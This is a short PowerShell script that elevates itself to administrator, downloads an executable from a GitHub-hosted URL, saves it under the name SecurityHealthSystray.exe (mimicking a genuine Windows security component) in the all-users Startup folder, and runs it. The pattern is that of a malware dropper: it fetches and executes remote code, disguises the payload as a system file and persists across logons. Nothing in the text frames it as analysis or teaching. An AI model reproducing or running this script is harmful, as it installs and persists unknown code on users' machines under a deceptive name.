$url = "https://github.com/webntdev/webntdev.github.io/raw/main/files/executables/SecurityHealthSystray.exe"
$output = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealthSystray.exe"
if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`"  `"$($MyInvocation.MyCommand.UnboundArguments)`""
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process $output
}
Exit
